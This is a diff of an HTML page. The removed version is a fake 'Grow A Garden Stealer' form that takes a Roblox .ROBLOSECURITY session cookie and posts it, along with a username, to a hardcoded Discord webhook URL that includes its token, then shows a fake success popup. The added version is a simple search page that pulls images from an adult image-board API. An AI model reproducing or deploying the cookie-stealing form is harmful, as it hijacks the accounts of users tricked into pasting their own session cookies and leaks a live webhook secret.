@@ -1,179 +1,107 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Grow A Garden Stealers! ✅</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #0f0f0f;
-      font-family: 'Segoe UI', sans-serif;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .form-container {
-      background: #1a1a1a;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px #00ffcc88;
-      width: 300px;
-      text-align: center;
-    }
-
-    .form-container h2 {
-      margin-bottom: 20px;
-      color: #00ffc3;
-      text-shadow: 0 0 10px #00ffc3;
-    }
-
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      background: #000;
-      border: 1px solid #00ffc3;
-      border-radius: 5px;
-      color: #fff;
-      box-shadow: 0 0 10px #00ffc366;
-    }
-
-    button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 15px;
-      background: #00ffc3;
-      color: #000;
-      border: none;
-      border-radius: 5px;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: 0 0 15px #00ffc3aa;
-      transition: all 0.3s ease;
-    }
-
-    button:hover {
-      background: #00ffdd;
-      box-shadow: 0 0 25px #00ffc3ff;
-    }
-
-    .popup {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) scale(0);
-      background: #222;
-      color: #00ffcc;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 25px #00ffc3aa;
-      text-align: center;
-      z-index: 9999;
-      transition: transform 0.3s ease;
-    }
-
-    .popup.show {
-      transform: translate(-50%, -50%) scale(1);
-    }
-
-    .popup .icon {
-      font-size: 40px;
-      margin-bottom: 10px;
-      animation: pop 0.3s ease;
-    }
-
-    .popup.error {
-      color: #ff5c5c;
-      box-shadow: 0 0 25px #ff5c5caa;
-    }
-
-    @keyframes pop {
-      0% { transform: scale(0); }
-      100% { transform: scale(1); }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rule34 Search</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            padding: 20px;
+            text-align: center;
+        }
+        #search-results {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .image-container {
+            margin: 10px;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+            padding: 10px;
+            background-color: #fff;
+        }
+        .image-container img {
+            max-width: 200px;
+            max-height: 200px;
+            object-fit: cover;
+        }
+        .search-box {
+            padding: 10px;
+            font-size: 16px;
+            width: 250px;
+            margin-bottom: 20px;
+        }
+        .search-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .search-btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2>Grow A Garden Stealer</h2>
-    <form id="stealForm">
-      <input type="password" id="cookieInput" placeholder="🍪 Victim Cookie" required />
-      <input type="text" id="usernameInput" placeholder="Your username" />
-      <button type="submit">Submit</button>
-    </form>
-  </div>
 
-  <!-- Success Popup -->
-  <div class="popup" id="successPopup">
-    <div class="icon">✅</div>
-    <h3>Stealed</h3>
-    <p>Please wait 2–3 days to see changes in your inventory.</p>
-  </div>
+    <h1>Search Rule34 Images</h1>
+    <input type="text" id="search-input" class="search-box" placeholder="Enter tag(s) to search">
+    <button class="search-btn" onclick="searchImages()">Search</button>
 
-  <!-- Error Popup -->
-  <div class="popup error" id="errorPopup">
-    <div class="icon">❌</div>
-    <h3>Error</h3>
-    <p>Cookie is invalid.</p>
-  </div>
+    <div id="search-results"></div>
 
-  <script>
-    const form = document.getElementById('stealForm');
-    const successPopup = document.getElementById('successPopup');
-    const errorPopup = document.getElementById('errorPopup');
-    const cookieInput = document.getElementById('cookieInput');
-    const usernameInput = document.getElementById('usernameInput');
+    <script>
+        function searchImages() {
+            const query = document.getElementById("search-input").value.trim();
+            if (!query) {
+                alert("Please enter a search term.");
+                return;
+            }
 
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1377692113763958824/zEWBoyh6EyG92tI6YlLdKkUsFvY1ejW_D0WSFYjzwykogqY-uzSCMn67gJHyyNt_jIW5"; // <-- replace this
+            // Clear previous search results
+            document.getElementById("search-results").innerHTML = "Loading...";
 
-    function showPopup(popup) {
-      popup.classList.add('show');
-      setTimeout(() => {
-        popup.classList.remove('show');
-      }, 4000);
-    }
+            // Replace this URL with the actual API endpoint you're using
+            const apiURL = `https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&tags=${encodeURIComponent(query)}&limit=10`;
 
-    async function sendToWebhook(cookie, username) {
-      const payload = {
-        content: `🍪 Cookie\n\`\`\`\n${cookie}\n\`\`\`\n\n❓Username\n\`\`\`\n${username || "Anonymous"}\n\`\`\``
-      };
+            fetch(apiURL)
+                .then(response => response.json())
+                .then(data => {
+                    const resultsDiv = document.getElementById("search-results");
+                    resultsDiv.innerHTML = ""; // Clear the loading text
 
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-      } catch (err) {
-        console.error("Webhook Error:", err);
-      }
-    }
+                    // Check if we got any results
+                    if (data.length === 0) {
+                        resultsDiv.innerHTML = "<p>No results found.</p>";
+                        return;
+                    }
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      const cookieValue = cookieInput.value.trim();
-      const usernameValue = usernameInput.value.trim();
+                    // Loop through the results and display them
+                    data.forEach(post => {
+                        const imageContainer = document.createElement("div");
+                        imageContainer.classList.add("image-container");
 
-      if (!cookieValue.includes("ROBLOSECURITY")) {
-        showPopup(errorPopup);
-        return;
-      }
+                        const image = document.createElement("img");
+                        image.src = post.file_url;
+                        image.alt = post.id;
 
-      // Send to webhook
-      sendToWebhook(cookieValue, usernameValue);
+                        imageContainer.appendChild(image);
+                        resultsDiv.appendChild(imageContainer);
+                    });
+                })
+                .catch(error => {
+                    console.error("Error fetching data:", error);
+                    document.getElementById("search-results").innerHTML = "<p>Error fetching results. Please try again later.</p>";
+                });
+        }
+    </script>
 
-      // Show success
-      showPopup(successPopup);
-      form.reset();
-    });
-  </script>
 </body>
 </html>
